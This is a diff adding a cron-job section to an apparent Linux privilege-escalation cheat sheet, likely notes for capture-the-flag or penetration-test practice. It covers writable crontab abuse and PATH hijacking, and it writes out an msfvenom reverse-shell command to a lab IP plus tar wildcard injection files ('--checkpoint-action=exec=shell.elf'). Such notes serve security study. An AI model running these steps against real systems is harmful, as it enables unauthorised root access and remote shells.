@@ -97,6 +97,34 @@ void hijack() {
 
 ## Cron jobs 
 
+- crontabs are usually located at ```/var/spool/cron/``` and ```/var/spool/cron/crontabs/```
+- system wide crontab is located at ```/etc/crontab```
+
+### File Permission + Cron
+- ```cat /etc/crontab```
+- check if cron jobs file are writeable ```ls -la```
+- edit with reverse shell or bin/sh
+
+### Path Env + Cron
+- crontab default path is ```/usr/bin:/bin```
+- you can create a file with same name so cron will trigger based on path
+- ```cat /etc/crontab``` under ```PATH``` to see the path
+
+### Wildcard + Cron
+- if a cron job file as ```*``` and GTFO said you can get a shell you may use this method
+- create a reverse shell with msfvenom 
+```
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.23 LPORT=8133 -f elf -o shell.elf
+```
+- transfer to victim and make it executable
+- run
+```
+touch ./--checkpoint=1
+touch ./--checkpoint-action=exec=shell.elf
+```
+- setup nc and await cronjob.
+
+
 
 ## Kernel Exploit (Last Resort)
 - To enumerate Kernel version ```uname -a```
